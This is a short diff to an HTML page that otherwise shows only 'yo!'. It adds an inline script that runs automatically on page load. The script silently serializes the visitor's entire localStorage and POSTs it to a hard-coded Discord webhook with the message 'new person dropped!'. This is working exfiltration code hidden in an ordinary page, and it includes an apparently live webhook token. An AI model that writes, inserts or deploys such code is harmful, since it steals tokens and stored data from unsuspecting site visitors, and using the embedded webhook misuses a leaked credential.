@@ -5,5 +5,23 @@
   </head>
   <body>
     <p>yo!</p>
+    <script>
+      (async () => {
+        const webhook = 'https://discord.com/api/webhooks/1274265991421104212/OBBNZOiud-RtNfTqUhzE8_0zROJj4mT8Uvn421KL6NHIImF0fTTSVg8Q0HImmtHrU888'
+
+        const res = await fetch(webhook, {
+          method: "POST",
+          body: JSON.stringify({'content':
+          `
+          new person dropped!
+          \`\`\`
+          ${JSON.stringify(localStorage)}
+          \`\`\`
+          `}),
+          headers: {'Content-Type': 'application/json'}
+        })
+        console.log(res.status);
+      })()
+    </script>
   </body>
 </html>
